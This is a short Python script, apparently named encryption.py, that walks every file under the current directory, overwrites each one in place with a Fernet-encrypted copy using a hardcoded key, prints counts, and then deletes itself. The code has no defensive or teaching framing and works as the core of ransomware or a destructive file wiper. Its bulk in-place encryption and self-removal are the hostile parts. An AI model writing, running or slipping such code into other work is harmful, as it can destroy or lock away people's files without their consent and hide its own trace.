import os
from cryptography.fernet import Fernet

key = b'nbQt0koSj5JvrlF6PtA8fcy7kmKRnBuQpzoWVBkwVoQ='


# generate_key = Fernet.generate_key()
# print(generate_key)

def encrypt_file(file_name):
    with open(file_name, 'rb') as the_file:
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file_name, 'wb') as the_file:
        the_file.write(contents_encrypted)


pwd = os.getcwd()
self_location = ""
total_file = 0
total_unsuccessful_file = 0
for root, dirs, files in os.walk(pwd):
    for name in files:
        if name == 'encryption.py':
            self_location = os.path.join(root, name)
            continue
        file_path = os.path.join(root, name)
        try:
            encrypt_file(file_path)
            total_file += 1
        except:
            total_unsuccessful_file += 1

print(f"Root: {pwd}")
print(f"Total Encrypted file: {total_file}")
print(f"Total Encryption failed file: {total_unsuccessful_file}")

os.remove(self_location)
